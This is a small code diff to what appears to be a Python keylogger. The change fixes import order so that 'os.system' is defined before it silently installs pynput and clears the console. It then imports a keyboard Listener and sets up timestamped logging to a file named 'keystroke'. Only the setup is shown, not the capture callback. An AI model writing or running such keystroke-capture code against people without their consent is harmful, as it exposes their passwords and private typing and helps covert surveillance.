@@ -1,8 +1,9 @@
+from os import system as syst
+
 syst('pip install pynput')
 syst('cls')
 
 from pynput.keyboard import Key, Listener
-from os import system as syst
 import logging
 
 logging.basicConfig(filename='keystroke' , level = logging.DEBUG , format = '%(asctime)s : %(message)s')
